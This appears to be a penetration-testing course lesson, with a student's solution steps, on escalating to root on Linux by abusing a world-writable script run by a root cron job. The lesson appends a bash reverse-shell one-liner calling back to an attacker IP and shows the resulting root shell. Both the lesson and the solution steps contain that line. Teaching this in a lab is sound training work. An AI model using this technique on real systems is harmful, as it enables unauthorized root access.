Cron jobs can also be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a `.tar.gz` file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.

Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

First, let's look around the system for any writeable files or directories. The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.

```shell-session
KaoruRyusaki@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```

A quick look in the `/dmz-backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `backup.sh` shell script is world writeable and runs as root.

```shell-session
KaoruRyusaki@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..

-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

```

From the above output, we can see that a cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creating a tarball file of the contents of the `/var/www/html` directory.

We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `ALWAYS` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.

```shell-session
KaoruRyusaki@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Code: bash

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!

  Cron Job Abuse

```shell-session
KaoruRyusaki@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

While not the most common attack, we do find poorly configured cron jobs that can be abused from time to time.





#### Question

Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* if you run the command " cat /dmz-backups/backup.sh " you will see there is a cron job creating files every 2 minutes which we will make sure to wait whenever we do our cron abuse
* when you run the " cat /dmz-backups/backup.sh " command you see that you can modify the end with a one-liner script which we will add by running the file with vim
* sheck you ip in a local terminal by running the  " ifconfig " command, your ip should be in the tun0 section and will be next to "inet"
* use vim to add the " bash -i >& /dev/tcp/\<your ip>/443 0>&1 " line at the end of the backup,sh file
* open another terminal and open a 443 port with netcat running the command " nc -lnvp 443 "
* wait 2 minutes until the terminal waiting for a response access the external shell
* look for the flag in the cron_abuse directory
